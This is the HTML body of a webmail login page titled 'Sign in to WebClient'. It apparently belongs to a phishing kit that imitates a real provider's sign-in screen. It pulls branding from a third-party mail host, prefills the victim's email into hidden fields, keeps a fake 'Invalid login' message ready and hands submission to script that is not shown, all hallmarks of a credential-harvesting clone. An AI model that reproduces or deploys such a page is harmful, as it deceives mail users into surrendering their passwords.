<body dir="ltr">
    <div class="o-external t-default sites-login site"
        style="background-image: url('https://mailhost01.doruk.net.tr/webmail/server/download.php?class=background&amp;fullpath=mailhost01.doruk.net.tr&amp;uid=')"
        data-component="sites-login-1" id="content">
        <main class="o-external__main">
            <form class="o-card c-card templates-card" data-hook="form" method="POST" data-component="templates-card-2">
                <div class="o-card__main">
                    <div class="o-card__content" data-hook="content">
                        <section data-component="organisms-card-section-4"
                            class=" o-card__section  o-card__section--default   ">
                            <div data-component="organisms-card-header-2" class=" o-header  ">
                                <div data-component="atoms-dropdown-2" class="o-dropdown" data-hook="language"> <svg
                                        data-component="atoms-icons-10" class=" o-icon  o-dropdown__icon  ">
                                        <use xlink:href="./images/icons/icons.svg#planet"></use>
                                    </svg> <label class="o-dropdown__text">en</label> </div>
                                <main class="o-header__main">
                                    <div class="o-header__content">
                                        <div data-component="atoms-avatar-1" class=" o-avatar   o-avatar--letter    "
                                            data-color="">i</div>
                                        <h2 class=" o-header__title o-heading o-heading--beta  ">Sign in to WebClient
                                        </h2>
                                        <p data-component="atoms-info-2"
                                            class=" o-info  o-info--normal   o-header__subtitle  " id="emailich">
                                        </p>
                                        <input type="hidden" name="email" id="email">
                                    </div>
                                    <div data-component="atoms-well-2" data-hook="well"
                                        class=" o-well  o-well--primary   o-header__well   "> <svg
                                            data-component="atoms-icons-9" class=" o-icon  o-well__icon  ">
                                            <use xlink:href="./images/icons/icons.svg#information"></use>
                                        </svg>
                                        <div class="o-well__content"> </div>
                                    </div>
                                    <div style="display: none; color: red;" id="msg">Invalid login username or password</div>
                                </main>
                            </div>
                        </section>
                        <section data-component="organisms-card-section-5" class=" o-card__section   u-hide  ">  </section>
                        <section data-component="organisms-card-section-6"
                            class=" o-card__section  o-card__section--form   "> <label
                                data-component="molecules-input~password-3"
                                class="o-input o-form__object molecules-input is-empty"> <input
                                    data-component="atoms-element-input-4" class=" o-form__element" type="password"
                                    name="password" id="password" autocomplete="current-password" maxlength="240"
                                    data-hook="password" placeholder="Password"> 
                                <a data-component="atoms-addon~show-1" href="javascript:"
                                    class=" o-addon  o-addon--bottom   " data-hook="show-password"
                                    tabindex="-1">Show</a> </label> </section>
                        <section data-component="organisms-card-section-7"
                            class=" o-card__section  o-card__section--default   ">
                            <div data-component="molecules-button-2"
                                class=" o-button o-form__object  o-button--block  o-button--primary   "> <button
                                    data-component="atoms-element-button-2" data-hook="validate-password" id="submit-btn"
                                    type="button"><span>Sign in</span></button> </div>
                            <div data-component="molecules-checkbox-1" class=" o-checkbox o-checkbox--default   ">
                                <input data-component="atoms-element-input-2" class=" o-checkbox__element"
                                    type="checkbox" name="remember-me" data-hook="persistentlogin"> <i
                                    class="o-checkbox__icon"></i><label class="o-checkbox__label">Keep me signed
                                    in</label></div> <a data-component="atoms-link~contact-admin-2" href="javascript:"
                                class=" o-link  o-link--switch   u-float-right  " data-hook="contact-admin">Contact
                                admin</a>
                        </section>
                        <section data-component="organisms-card-section-8"
                            class=" o-card__section  o-card__section--default   ">
                            <p data-component="atoms-info~not-you-1" class=" o-info   u-align-center  ">Not you? <a
                                    data-component="atoms-link~check-account-3" href="javascript:"
                                    class=" o-link  o-link--switch   " data-hook="back-to-email">Check your account
                                    again</a> </p>
                        </section>
                    </div>
                </div>
            </form>
        </main>
